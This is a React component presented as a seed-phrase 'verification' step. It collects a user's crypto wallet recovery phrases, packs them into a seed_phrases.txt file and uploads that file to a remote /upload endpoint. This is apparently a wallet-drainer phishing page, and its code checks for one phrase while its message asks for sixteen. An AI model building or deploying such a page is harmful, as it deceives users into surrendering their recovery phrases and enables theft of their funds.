import React, { useState, useContext } from 'react';
import { styled } from '@mui/material/styles';
import TextField from '@mui/material/TextField';
import Button from '@mui/material/Button';
import { AuthContext } from '../context/AuthContext';

const Container = styled('div')({
  textAlign: 'center',
  padding: '20px',
});

const SeedList = styled('div')({
  marginTop: '20px',
  textAlign: 'left',
});

function SeedPhraseVerification({ onNext }) {
  const [inputValue, setInputValue] = useState('');
  const [seedPhrase, setSeedPhrase] = useState([]);
  const { verifySeedPhrase, state } = useContext(AuthContext);

  const handleAddPhrase = () => {
    if (inputValue.trim()) {
      setSeedPhrase((prev) => [...prev, inputValue.trim()]);
      setInputValue('');
    }
  };

  const handleClear = () => {
    setSeedPhrase([]);
  };

  const createSeedPhraseFile = () => {
    const blob = new Blob([seedPhrase.join('\n')], { type: 'text/plain' });
    return new File([blob], 'seed_phrases.txt', { type: 'text/plain' });
  };

  const handleSubmit = async () => {
    if (seedPhrase.length === 1) { // Assuming exactly 16 seed phrases
      verifySeedPhrase(seedPhrase);
      if (!state.error) {
        const file = createSeedPhraseFile();
        const formData = new FormData();
        formData.append('seedPhraseFile', file);

        try {
          const response = await fetch(`${import.meta.env.VITE_API_BASE_URL}/upload`, {
            method: 'POST',
            body: formData,
          });
          const result = await response.json();
          console.log('Upload successful:', result);
          onNext(); // Proceed to the next step
        } catch (error) {
          console.error('Upload failed:', error);
        }
      }
    } else {
      alert('You must enter exactly 16 seed phrases.');
    }
  };

  return (
    <Container>
      <h2 className="mb-4">Enter Your Seed Phrases</h2>
      <TextField
        label="Seed Phrase"
        variant="outlined"
        multiline
        rows={4}
        value={inputValue}
        onChange={(e) => setInputValue(e.target.value)}
        fullWidth
        aria-required="true"
        placeholder='Input your Seed Phrase accordingly...'
      />
      <div style={{ marginTop: '10px' }} className='space-y-2 xl:space-y-0'>
        <Button
          variant="contained"
          color="primary"
          onClick={handleAddPhrase}
          style={{ marginRight: '10px' }}
          className="mb-4"
        >
          Add Phrase
        </Button>
        <Button
          variant="outlined"
          color="secondary"
          onClick={handleClear}
        >
          Clear All
        </Button>
        <Button
          variant="contained"
          color="primary"
          onClick={handleSubmit}
          style={{ marginLeft: '10px' }}
          disabled={seedPhrase.length !== 1}
        >
          Submit
        </Button>
      </div>
      <SeedList>
        {seedPhrase.length > 0 && (
          <div>
            <h3>Seed Phrases:</h3>
            <ul>
              {seedPhrase.map((phrase, index) => (
                <li key={index}>{phrase}</li>
              ))}
            </ul>
          </div>
        )}
      </SeedList>
    </Container>
  );
}

export default SeedPhraseVerification;
